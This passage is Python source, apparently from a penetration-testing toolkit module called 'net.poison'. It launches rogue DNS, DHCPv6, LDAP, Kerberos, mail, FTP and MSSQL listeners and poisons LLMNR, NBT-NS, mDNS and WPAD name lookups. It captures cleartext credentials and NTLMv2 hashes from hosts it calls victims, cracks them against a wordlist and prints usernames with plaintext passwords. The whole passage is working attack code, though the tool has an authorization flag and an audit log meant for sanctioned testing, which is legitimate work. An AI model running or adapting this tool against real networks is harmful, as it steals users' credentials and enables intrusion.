            dns = DNSListener(state, verbose=verbose)
            if dns.start():
                listeners.append(dns)
            else:
                warn("poison: DNS listener failed to bind")

        if enable_dhcpv6:
            dhcpv6 = DHCPv6Listener(state, verbose=verbose)
            if dhcpv6.start():
                listeners.append(dhcpv6)
            else:
                warn("poison: DHCPv6 listener failed to bind")

        if enable_ldap:
            ldap = LDAPListener(state, verbose=verbose)
            if ldap.start():
                listeners.append(ldap)
            else:
                warn("poison: LDAP listener failed to bind")

        if enable_kerberos:
            kerb = KerberosListener(state, verbose=verbose)
            if kerb.start():
                listeners.append(kerb)
            else:
                warn("poison: Kerberos listener failed to bind")

        if enable_ftp:
            ftp = FTPListener(state, verbose=verbose)
            if ftp.start():
                listeners.append(ftp)
            else:
                warn("poison: FTP listener failed to bind")

        if enable_smtp:
            smtp = PlaintextAuthListener(
                state, port=SMTP_PORT, protocol="smtp",
                banner=SMTP_BANNER, verbose=verbose)
            if smtp.start():
                listeners.append(smtp)
            else:
                warn("poison: SMTP listener failed to bind")

        if enable_pop3:
            pop3 = PlaintextAuthListener(
                state, port=POP3_PORT, protocol="pop3",
                banner=POP3_BANNER, verbose=verbose)
            if pop3.start():
                listeners.append(pop3)
            else:
                warn("poison: POP3 listener failed to bind")

        if enable_imap:
            imap = PlaintextAuthListener(
                state, port=IMAP_PORT, protocol="imap",
                banner=IMAP_BANNER, verbose=verbose)
            if imap.start():
                listeners.append(imap)
            else:
                warn("poison: IMAP listener failed to bind")

        if enable_mssql:
            mssql = MSSQLListener(state, verbose=verbose)
            if mssql.start():
                listeners.append(mssql)
            else:
                warn("poison: MSSQL listener failed to bind")

    info(f"poison: sniffing for {duration}s "
         f"({'ACTIVE' if state.active else 'passive'})")
    try:
        await _sniff_loop(state, duration, verbose)
    finally:
        state.shutdown.set()
        for lst in listeners:
            try:
                lst.stop()
            except Exception:
                pass

    if store is not None:
        _persist(state, store)

    cracked: dict[str, str] = {}
    if wordlist:
        cracked = _crack_hashes(state, wordlist, verbose=verbose)

    _print_summary(state, cracked)

    if state.active:
        _audit_log(state,
                   f"session end: {len(state.captures)} captures, "
                   f"{len(state.captured_from)} hash(es) from "
                   f"{len(state.captured_from)} victim(s)")

    return {
        "captures": state.captures,
        "cracked": cracked,
        "my_ip": my_ip,
        "iface": iface,
    }


def _print_summary(state: PoisonState, cracked: dict):
    print()

    def _count(kind):
        return sum(1 for c in state.captures if c.kind == kind)

    llmnr = _count("llmnr-query")
    nbns = _count("nbns-query")
    mdns = _count("mdns-query")
    wpad = _count("wpad-request")
    dhcpv6 = _count("dhcpv6-solicit")
    dns = _count("dns-query")
    kerb = _count("kerberos-asreq")

    ftp = _count("ftp-cred")
    smtp = _count("smtp-cred")
    pop3 = _count("pop3-cred")
    imap = _count("imap-cred")
    ldap = _count("ldap-bind")
    http_basic = _count("http-basic")
    mssql_sql = _count("mssql-sql-auth")
    mssql_ntlm = _count("mssql-ntlm")

    poisoned = sum(1 for c in state.captures if c.poisoned)
    hashes = [c for c in state.captures if c.kind == "ntlm-hash"]

    success("poison: session summary")
    print(f"  LLMNR queries:     {llmnr}")
    print(f"  NBT-NS queries:    {nbns}")
    print(f"  mDNS queries:      {mdns}")
    print(f"  WPAD lookups:      {wpad}")
    print(f"  DHCPv6 SOLICITs:   {dhcpv6}")
    print(f"  DNS queries:       {dns}")
    print(f"  Kerberos AS-REQs:  {kerb}")
    print(f"  Poisoned:          {poisoned}")

    cred_total = (ftp + smtp + pop3 + imap + ldap + http_basic +
                  mssql_sql)
    if cred_total:
        print()
        success(f"Cleartext credentials captured: {cred_total}")
        if ftp:
            print(f"  FTP:       {ftp}")
        if smtp:
            print(f"  SMTP:      {smtp}")
        if pop3:
            print(f"  POP3:      {pop3}")
        if imap:
            print(f"  IMAP:      {imap}")
        if ldap:
            print(f"  LDAP:      {ldap}")
        if http_basic:
            print(f"  HTTP Basic:{http_basic}")
        if mssql_sql:
            print(f"  MSSQL:     {mssql_sql}")

    print()
    if hashes:
        success(f"NTLM hashes captured: {len(hashes)}")
        for c in hashes:
            tag = " (cracked)" if c.ntlmv2_hash in cracked else ""
            print(f"  {c.src_ip:18s} {c.domain}\\{c.username}{tag}")
            print(f"    {c.ntlmv2_hash}")
            if c.ntlmv2_hash in cracked:
                print(f"    → plaintext: {cracked[c.ntlmv2_hash]!r}")
    else:
        info("NTLM hashes captured: 0")

    if mssql_ntlm:
        print()
        info(f"MSSQL NTLM blobs captured: {mssql_ntlm}")

    if state.active:
        print()
        warn("audit log entry written to loot/poison_audit.log")


# =====================================================================
# CLI
# =====================================================================

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="net.poison",
        description=("LLMNR / NBT-NS / mDNS / WPAD / DHCPv6 / DNS / "
                     "LDAP / Kerberos / FTP / SMTP / POP3 / IMAP / MSSQL "
                     "capture. Passive by default, active poisoning with "
                     "--active and --authorized-by."),
    )
    p.add_argument("--duration", "-d", type=int, default=60)
    p.add_argument("--active", action="store_true")
    p.add_argument("--authorized-by", default=None)
    p.add_argument("--interface", "-i", default=None)
    p.add_argument("--smb-port", type=int, default=SMB_PORT)
    p.add_argument("--http-port", type=int, default=HTTP_PORT)
    p.add_argument("--wordlist", default=None)
    p.add_argument("--store", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")

    # Per-listener toggles (active mode only)
    p.add_argument("--no-wpad", action="store_true",
                   help="disable WPAD listener")
    p.add_argument("--no-dhcpv6", action="store_true",
                   help="disable DHCPv6 listener")
    p.add_argument("--no-dns", action="store_true",
                   help="disable DNS listener")
    p.add_argument("--no-ldap", action="store_true",
                   help="disable LDAP listener")
    p.add_argument("--no-kerberos", action="store_true",
                   help="disable Kerberos listener")
    p.add_argument("--no-ftp", action="store_true",
                   help="disable FTP listener")
    p.add_argument("--no-smtp", action="store_true",
                   help="disable SMTP listener")
    p.add_argument("--no-pop3", action="store_true",
                   help="disable POP3 listener")
    p.add_argument("--no-imap", action="store_true",
                   help="disable IMAP listener")
    p.add_argument("--no-mssql", action="store_true",
                   help="disable MSSQL listener")
    args = p.parse_args()

    store = None
    workspace = None
    if args.store:
        from core.workspace import get_active, get_workspace
        from core.store import open_store
        active = get_active()
        if not active:
            warn("no active workspace; "
                 "use `toolkit workspace switch <name>` first")
            return
        workspace = get_workspace(active)
        store = open_store(workspace.db_path, workspace_name=active)

    asyncio.run(run(
        duration=args.duration,
        active=args.active,
        authorized_by=args.authorized_by,
        interface=args.interface,
        verbose=args.verbose,
        wordlist=args.wordlist,
        store=store,
        workspace=workspace,
        smb_port=args.smb_port,
        http_port=args.http_port,
        enable_wpad=not args.no_wpad,
        enable_dhcpv6=not args.no_dhcpv6,
        enable_dns=not args.no_dns,
        enable_ldap=not args.no_ldap,
        enable_kerberos=not args.no_kerberos,
        enable_ftp=not args.no_ftp,
        enable_smtp=not args.no_smtp,
        enable_pop3=not args.no_pop3,
        enable_imap=not args.no_imap,
        enable_mssql=not args.no_mssql,
    ))


if __name__ == "__main__":
    _cli()